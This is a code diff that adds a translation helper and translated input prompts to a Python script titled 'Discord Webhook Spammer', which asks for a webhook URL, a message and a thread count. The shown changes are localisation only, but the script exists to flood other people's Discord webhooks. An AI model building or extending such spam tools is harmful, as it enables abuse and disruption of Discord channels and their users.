@@ -1,5 +1,12 @@
 from Config.Util import *
 from Config.Config import *
+from Config.Translates import *
+
+current_language = LANGUAGE
+
+def tr(key):
+    return translations[current_language].get(key, key)
+
 try:
     import requests
     import json
@@ -10,12 +17,12 @@ except Exception as e:
 Title("Discord Webhook Spammer")
 
 try:
-    webhook_url = input(f"{color.RED}\n{INPUT} Webhook URL -> {color.RESET}")
+    webhook_url = input(f"{color.RED}\n{INPUT} {tr('URLWebhook')} -> {color.RESET}")
     CheckWebhook(webhook_url)
     message = input(f"{color.RED}{INPUT} Message -> {color.RESET}")
 
     try:
-        threads_number = int(input(f"{INPUT} Threads Number -> {color.RESET}"))
+        threads_number = int(input(f"{INPUT} {tr('ThreadsNumber')} -> {color.RESET}"))
     except:
         ErrorNumber()
 
